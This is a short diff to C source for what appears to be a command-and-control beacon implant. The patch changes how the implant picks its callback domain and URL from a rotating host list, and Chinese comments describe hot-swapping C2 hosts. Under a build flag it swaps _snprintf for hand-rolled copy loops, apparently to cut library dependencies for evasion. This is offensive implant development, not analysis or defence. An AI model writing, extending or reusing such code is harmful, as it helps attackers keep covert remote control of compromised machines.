@@ -221,8 +221,16 @@ void beacon(LPVOID lpReserved) {
 		/* 4.10 beacon_config host 热换：覆盖层接管后每周期从这里取
 		 * host/uri（round-robin 跳 held）；未接管时走烘焙 strategy 路径 */
 		if (!hostcfg_pick(beacon_domain, 128, url, 256)) {
+#ifdef BW_PLAIN_SLEEP
+			{ char * d_; const char * s_;
+			  d_ = beacon_domain; s_ = next_host(hosts, failedHost, &strategyInfo);
+			  { size_t n_ = 0; while (*s_ && n_ < 127) { *d_++ = *s_++; n_++; } *d_ = 0; }
+			  d_ = url; s_ = next_host(hosts, failedHost, &strategyInfo);
+			  { size_t n_ = 0; while (*s_ && n_ < 127) { *d_++ = *s_++; n_++; } *d_ = 0; } }
+#else
 			_snprintf(beacon_domain, 128, "%s", next_host(hosts, failedHost, &strategyInfo));
 			_snprintf(url, 128, "%s", next_host(hosts, failedHost, &strategyInfo));
+#endif
 		}
 		failedHost = FALSE;
 
